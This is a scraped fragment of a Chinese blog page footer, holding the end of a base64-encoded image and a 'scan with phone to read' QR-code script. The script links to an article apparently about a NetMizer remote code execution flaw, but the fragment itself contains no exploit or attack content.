ab3C9W4jbFb3HdaO5bl3eferpScnPMJm1ep7czDpHTTS7ZnLd+hlvPb2pMz3eWuZEPbno/QZ3C7Hpxu95Ao+fsvr4bCvVulttNJeelFw0Hy+l3mhO1E9PSq7/DJNfy94r/Nnz7+ff6XdeX73vQf1X8P6E/MpT+4M9j5+y3Lp4dqa+aM63RH6G5uyXd16/dbn+EZo5Q3vOzlYXzTtPXS6aa9QX23de8P6E+JTeBB/fQ7Kdr9TV/fdb0HnPal1+5XcuebXGeCnvKdepzp3xZFPtO6/1ZFOty+Ol5Cven5D1abzB9WMhbvsKX73nvAFrdZ/ntN78Kqcf7F7Pj5dq/4qnJ3WVaz89qdbl8VLyFR8LWcX7+vuewG4hvlWNZ7eYTa/VudVbr82pnXF176e5+opmenbrV7550bzomfryRn375KJ6cLcQQzd+zxP4bQs5eyv8ss589c7lbUmpN8Y7K7Nns/Ubnaduv7pcX9Rv3rr95o7wty3kaPitff0J/OeFuHXfhsb2X71F+8w7V36E9pgVj7LRzOc61fyqPz0p+8zLxWTWal0e/M8LWQ+6r//7E9gtxC03nh1lLts9Kn37v8p7pnOe4VmPZ+vLe5a++hXvOXLROXLxSN8txNCN3/MEHgvxLbjCs9t066K5nte6vLHn6Le+zjcjml0zuVY3J57p7XcuM9cyr3bGW0/+sRDNG7/3CdwL+d7nvzv9fwAAAP//i45hAgAAAAZJREFUAwDbUaq/JX/rDwAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-chart-hostdelay-username-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 